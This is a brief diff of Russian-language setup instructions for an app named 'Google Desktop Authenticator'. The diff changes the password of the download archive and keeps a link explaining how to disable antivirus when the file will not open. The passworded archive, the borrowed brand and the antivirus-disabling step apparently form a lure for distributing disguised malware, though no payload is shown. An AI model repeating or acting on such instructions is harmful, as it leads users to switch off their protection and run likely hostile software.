@@ -11,9 +11,8 @@
 
 3. Отрыть приложение Google Desktop Authenticator
 
-4 Пароль от архива " BDO "
+4 Пароль от архива " GA "
 
 
-Как выглядит программа - https://i.imgur.com/l8kdh6r.png
 
 Как отключить АНТИВИРУС - https://imgur.com/a/FXBImRK  ( Если не открывается файл )
